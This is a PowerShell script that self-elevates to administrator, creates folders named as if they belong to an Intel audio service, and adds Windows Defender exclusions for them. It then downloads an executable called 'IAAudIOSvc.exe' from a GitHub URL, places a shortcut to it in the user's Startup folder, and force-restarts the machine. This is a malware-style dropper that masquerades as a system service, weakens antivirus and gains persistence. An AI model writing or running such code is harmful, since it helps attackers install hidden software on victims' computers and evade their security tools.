Clear-Host
# Self-elevate the script if required
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
      if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
       $CommandLine = "-File `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
       Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
       Start-Sleep -Seconds 60
      #  Exit
      }
     }
     
     # Remainder of script here
      $WScriptShell = New-Object -ComObject WScript.Shell
      $FolderPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
      $ShortcutFile = "$FolderPath\IAAudIOSvc.lnk"
      $TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\IAAudIOSvc"
      $TargetFile = "$TargetPath\IAAudIOSvc.exe"
      
      If(!(Test-Path $FolderPath)) {
            New-Item -ItemType Directory -Force -Path $FolderPath
            Add-MpPreference -ExclusionPath $FolderPath
      }

      if (! (test-path $TargetPath)) {
            New-Item -ItemType Directory -Force -Path $TargetPath
            Add-MpPreference -ExclusionPath $TargetPath

      }

      if (! (test-path $TargetFile)) {
            Invoke-WebRequest -Uri https://github.com/B95segal/intelaudioservice/blob/main/dist/IAAudIOSvc.exe -OutFile $TargetFile
      }


      $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
      $Shortcut.TargetPath = $TargetFile
      $Shortcut.WorkingDirectory = $TargetPath
      $Shortcut.IconLocation = "$TargetPath\IAAudIOSvc.exe,0"
      $Shortcut.Save()
      Restart-Computer -Force
